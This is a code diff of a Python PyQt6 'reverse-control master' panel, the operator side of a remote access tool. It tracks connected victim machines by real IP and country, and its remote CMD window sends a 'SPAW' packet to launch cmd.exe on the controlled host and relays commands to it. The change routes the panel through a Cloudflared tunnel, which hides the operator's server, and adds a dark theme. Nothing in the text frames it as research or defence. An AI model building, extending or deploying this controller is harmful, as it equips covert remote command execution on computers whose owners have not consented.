@@ -11,6 +11,7 @@ from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QH
                              QLabel, QLineEdit, QPushButton, QListView, QTextEdit, QDialog,
                              QMenu, QAbstractItemView)
 from PyQt6.QtCore import Qt, QAbstractListModel, QVariant, QModelIndex, pyqtSignal, QObject, pyqtSlot, QTimer
+from PyQt6.QtGui import QColor, QPalette
 
 WS_OP_CONTINUE = 0x00
 WS_OP_TEXT = 0x01
@@ -103,14 +104,17 @@ def ws_parse_frame(data: bytearray):
     return (fin, opcode, payload, consumed)
 
 
-def ws_handle_http_upgrade(sock: socket.socket) -> tuple[bool, str]:
-    """处理WebSocket HTTP GET 升级握手，返回 (成功与否, 真实IP字符串)"""
+def ws_handle_http_upgrade(sock: socket.socket) -> tuple[bool, str, str, str]:
+    """
+    处理WebSocket HTTP GET 升级握手
+    返回: (成功与否, 真实IP, 国家代码, 显示名称)
+    """
     buf = bytearray()
     start = time.time()
     try:
         while True:
             if time.time() - start > 8:
-                return False, ""
+                return False, "", "", ""
             chunk = sock.recv(1024)
             if not chunk:
                 time.sleep(0.01)
@@ -119,15 +123,15 @@ def ws_handle_http_upgrade(sock: socket.socket) -> tuple[bool, str]:
             if b"\r\n\r\n" in buf:
                 break
     except Exception:
-        return False, ""
+        return False, "", "", ""
 
     first_line = buf.split(b"\r\n")[0]
     parts = first_line.split(b" ")
     if len(parts) < 3:
-        return False, ""
+        return False, "", "", ""
     method, path, proto = parts
     if path not in (b"/", b"/ws"):
-        return False, ""
+        return False, "", "", ""
 
     headers = {}
     for line in buf.split(b"\r\n")[1:]:
@@ -139,7 +143,16 @@ def ws_handle_http_upgrade(sock: socket.socket) -> tuple[bool, str]:
             v = bytes(v_raw).strip()
             headers[k] = v
 
+    # 从 Cloudflare 头获取信息
     real_ip = headers.get(b"cf-connecting-ip", b"").decode("utf-8").strip()
+    country = headers.get(b"cf-ipcountry", b"").decode("utf-8").strip()
+    
+    # 如果没有国家信息，标记为未知
+    if not country:
+        country = "XX"
+    
+    # 构建显示名称: 国家 + IP
+    display_name = f"[{country}] {real_ip}" if real_ip else f"[{country}] 未知IP"
 
     conn_val = headers.get(b"connection", b"")
     upgrade_val = headers.get(b"upgrade", b"")
@@ -147,13 +160,13 @@ def ws_handle_http_upgrade(sock: socket.socket) -> tuple[bool, str]:
     ws_version = headers.get(b"sec-websocket-version")
 
     if conn_val != b"Upgrade":
-        return False, real_ip
+        return False, real_ip, country, display_name
     if upgrade_val != b"websocket":
-        return False, real_ip
+        return False, real_ip, country, display_name
     if not ws_key:
-        return False, real_ip
+        return False, real_ip, country, display_name
     if ws_version != b"13":
-        return False, real_ip
+        return False, real_ip, country, display_name
 
     accept_val = ws_compute_accept(ws_key)
 
@@ -167,8 +180,8 @@ def ws_handle_http_upgrade(sock: socket.socket) -> tuple[bool, str]:
     try:
         sock.sendall(resp)
     except Exception:
-        return False, real_ip
-    return True, real_ip
+        return False, real_ip, country, display_name
+    return True, real_ip, country, display_name
 
 
 class ClientSignals(QObject):
@@ -177,9 +190,11 @@ class ClientSignals(QObject):
 
 
 class ClientSession:
-    def __init__(self, conn: socket.socket, display_ip: str):
+    def __init__(self, conn: socket.socket, ip: str, country: str, display_name: str):
         self.conn = conn
-        self.ip_str = display_ip
+        self.ip = ip
+        self.country = country
+        self.display_name = display_name
         self.last_pong = datetime.now()
         self.connected = True
         self._recv_buf = bytearray()
@@ -189,15 +204,10 @@ class ClientSession:
         self._frag_opcode = 0
 
     def send_packet(self, body: bytes) -> bool:
-        """
-        发送业务数据包
-        body: 业务数据（如 b"EXEKdir"，不含长度头）
-        自动添加 4 字节长度头并封装成 WS BINARY 帧
-        """
+        """发送业务数据包"""
         if not self.connected:
             return False
         try:
-            # 加 4 字节长度头
             full_body = struct.pack(">I", len(body)) + body
             ws_frame = ws_build_server_frame(True, WS_OP_BINARY, full_body)
             with self._send_lock:
@@ -232,12 +242,20 @@ class RemoteCmdDialog(QDialog):
     def __init__(self, client_session: ClientSession, parent=None):
         super().__init__(parent)
         self.main_window = parent
-        self.setWindowTitle(f"远程CMD - {client_session.ip_str}")
+        self.setWindowTitle(f"远程CMD - {client_session.display_name}")
         self.resize(680, 450)
         self.client = client_session
         self.is_alive = True
 
         lay = QVBoxLayout(self)
+        
+        # 显示客户端信息
+        info_bar = QHBoxLayout()
+        info_bar.addWidget(QLabel(f"🌍 国家: {client_session.country}"))
+        info_bar.addWidget(QLabel(f"📡 IP: {client_session.ip}"))
+        info_bar.addStretch()
+        lay.addLayout(info_bar)
+
         self.out_box = QTextEdit()
         self.out_box.setReadOnly(True)
         lay.addWidget(self.out_box)
@@ -249,8 +267,22 @@ class RemoteCmdDialog(QDialog):
         input_lay.addWidget(self.cmd_input)
         lay.addLayout(input_lay)
 
-        self.out_box.append(f"==== 连接 {self.client.ip_str} 远程CMD ====\n[*] 已发送SPAW启动被控端cmd.exe")
+        self.out_box.append(f"==== 连接 {client_session.display_name} 远程CMD ====\n[*] 已发送SPAW启动被控端cmd.exe")
         self.client.send_packet(b"SPAW")
+
+        if parent and hasattr(parent, 'is_dark_mode'):
+            self.apply_theme(parent.is_dark_mode)
+
+    def apply_theme(self, dark: bool):
+        if dark:
+            self.setStyleSheet("""
+                QDialog { background-color: #1e1e1e; }
+                QLabel { color: #d4d4d4; }
+                QTextEdit { background-color: #2d2d2d; color: #d4d4d4; border: 1px solid #3d3d3d; }
+                QLineEdit { background-color: #2d2d2d; color: #d4d4d4; border: 1px solid #3d3d3d; }
+            """)
+        else:
+            self.setStyleSheet("")
 
     @pyqtSlot(str)
     def append_text(self, text: str):
@@ -289,7 +321,8 @@ class ClientListModel(QAbstractListModel):
         if not index.isValid() or role != Qt.ItemDataRole.DisplayRole:
             return QVariant()
         s = self.items[index.row()]
-        return QVariant(f"{s.ip_str} | last_pong:{s.last_pong.strftime('%H:%M:%S')}")
+        # 显示: [国家] IP | 最后心跳时间
+        return QVariant(f"{s.display_name} | last_pong:{s.last_pong.strftime('%H:%M:%S')}")
 
     def add(self, sess: ClientSession):
         self.beginInsertRows(QModelIndex(), len(self.items), len(self.items))
@@ -307,8 +340,9 @@ class MainWindow(QMainWindow):
     def __init__(self):
         super().__init__()
         self.base_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
+        self.is_dark_mode = False
 
-        self.setWindowTitle("WebSocket 反向控制主控端 (纯WS模式)")
+        self.setWindowTitle("WebSocket 反向控制主控端 (Cloudflared Tunnel 模式)")
         self.resize(720, 520)
         self.server_sock: socket.socket | None = None
         self.server_running = False
@@ -331,6 +365,14 @@ class MainWindow(QMainWindow):
         self.btn_stop.clicked.connect(self.stop_server)
         self.btn_stop.setEnabled(False)
         top_lay.addWidget(self.btn_stop)
+
+        top_lay.addStretch()
+
+        # 主题切换按钮
+        self.btn_theme = QPushButton("🌙 夜间模式")
+        self.btn_theme.clicked.connect(self.toggle_theme)
+        top_lay.addWidget(self.btn_theme)
+
         lay.addLayout(top_lay)
 
         self.view = QListView()
@@ -349,6 +391,54 @@ class MainWindow(QMainWindow):
         self.ping_timer.setInterval(10000)
         self.ping_timer.timeout.connect(self.broadcast_ping)
 
+        self.apply_theme(False)
+
+    def apply_theme(self, dark: bool):
+        self.is_dark_mode = dark
+        if dark:
+            self.setStyleSheet("""
+                QMainWindow { background-color: #1e1e1e; }
+                QWidget { background-color: #1e1e1e; }
+                QLabel { color: #d4d4d4; }
+                QLineEdit { 
+                    background-color: #2d2d2d; 
+                    color: #d4d4d4; 
+                    border: 1px solid #3d3d3d;
+                    padding: 4px;
+                }
+                QPushButton { 
+                    background-color: #3d3d3d; 
+                    color: #d4d4d4; 
+                    border: 1px solid #4d4d4d;
+                    padding: 5px 15px;
+                }
+                QPushButton:hover { background-color: #4d4d4d; }
+                QPushButton:disabled { color: #666; background-color: #2d2d2d; }
+                QListView { 
+                    background-color: #2d2d2d; 
+                    color: #d4d4d4; 
+                    border: 1px solid #3d3d3d;
+                }
+                QListView::item:selected { background-color: #3d7a9e; }
+                QTextEdit { 
+                    background-color: #2d2d2d; 
+                    color: #d4d4d4; 
+                    border: 1px solid #3d3d3d;
+                }
+                QMenu { background-color: #2d2d2d; color: #d4d4d4; border: 1px solid #3d3d3d; }
+                QMenu::item:selected { background-color: #3d7a9e; }
+            """)
+            self.btn_theme.setText("☀️ 日间模式")
+        else:
+            self.setStyleSheet("")
+            self.btn_theme.setText("🌙 夜间模式")
+
+        for dlg in self.open_cmd_dialogs.values():
+            dlg.apply_theme(dark)
+
+    def toggle_theme(self):
+        self.apply_theme(not self.is_dark_mode)
+
     def log(self, msg):
         self.log_box.append(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")
 
@@ -362,22 +452,25 @@ class MainWindow(QMainWindow):
         while self.server_running:
             try:
                 raw_conn, addr = self.server_sock.accept()
-                ok_handshake, real_ip = ws_handle_http_upgrade(raw_conn)
+                ok_handshake, ip, country, display_name = ws_handle_http_upgrade(raw_conn)
                 if not ok_handshake:
                     self.log(f"WebSocket握手失败 {addr}")
                     raw_conn.close()
                     continue
 
-                if real_ip:
-                    display_ip = real_ip
-                else:
-                    display_ip = f"{addr[0]}:{addr[1]}"
+                # 如果 Cloudflare 没传 IP，使用 socket 地址
+                if not ip:
+                    ip = addr[0]
+                if not country:
+                    country = "XX"
+                if not display_name:
+                    display_name = f"[{country}] {ip}"
 
-                sess = ClientSession(raw_conn, display_ip)
+                sess = ClientSession(raw_conn, ip, country, display_name)
                 sess.signals.on_outp.connect(self.handle_session_outp)
                 sess.signals.on_disconnect.connect(self.handle_session_disconnect)
                 self.client_model.add(sess)
-                self.log(f"[新接入] {sess.ip_str}")
+                self.log(f"[新接入] {display_name}")
                 t = threading.Thread(target=self.client_recv_loop, args=(sess,), daemon=True)
                 t.start()
             except OSError:
@@ -395,7 +488,7 @@ class MainWindow(QMainWindow):
             dlg = self.open_cmd_dialogs.pop(sess)
             dlg.append_text("\n[!] WebSocket连接已经断开")
         self.client_model.remove_by_obj(sess)
-        self.log(f"[断开] {sess.ip_str}")
+        self.log(f"[断开] {sess.display_name}")
 
     def client_recv_loop(self, sess: ClientSession):
         buf = sess._recv_buf
@@ -413,7 +506,6 @@ class MainWindow(QMainWindow):
                         break
                     del buf[:consumed]
 
-                    # 处理控制帧
                     if opcode == WS_OP_PING:
                         pong_frame = ws_build_server_frame(True, WS_OP_PONG, payload)
                         with sess._send_lock:
@@ -424,9 +516,8 @@ class MainWindow(QMainWindow):
                     elif opcode == WS_OP_CLOSE:
                         break
                     elif opcode == WS_OP_TEXT:
-                        # Postman调试用
                         text_msg = payload.decode("utf-8", errors="replace")
-                        self.log(f"[DEBUG TEXT] {sess.ip_str}: {text_msg}")
+                        self.log(f"[DEBUG TEXT] {sess.display_name}: {text_msg}")
                         continue
                     elif opcode in (WS_OP_BINARY, WS_OP_CONTINUE):
                         if opcode == WS_OP_BINARY:
@@ -436,7 +527,6 @@ class MainWindow(QMainWindow):
                         if fin:
                             full_body = bytes(sess._frag_buf)
                             sess.reset_fragment()
-                            # 解析业务协议：4字节长度头 + body
                             if len(full_body) >= 4:
                                 body_len = struct.unpack(">I", full_body[0:4])[0]
                                 if len(full_body) >= 4 + body_len:
@@ -458,11 +548,11 @@ class MainWindow(QMainWindow):
 
     def start_server(self):
         port = int(self.port_edit.text())
-        self.log(f"启动 WS 服务器，监听 0.0.0.0:{port}")
+        self.log(f"启动 Cloudflared Tunnel 模式，监听 127.0.0.1:{port}")
 
         self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        self.server_sock.bind(("0.0.0.0", port))
+        self.server_sock.bind(("127.0.0.1", port))
         self.server_sock.listen(8)
         self.server_running = True
         threading.Thread(target=self.accept_loop, daemon=True).start()
@@ -504,6 +594,7 @@ class MainWindow(QMainWindow):
                 else:
                     del self.open_cmd_dialogs[sess]
             dlg = RemoteCmdDialog(sess, parent=self)
+            dlg.apply_theme(self.is_dark_mode)
             self.open_cmd_dialogs[sess] = dlg
             dlg.show()
 
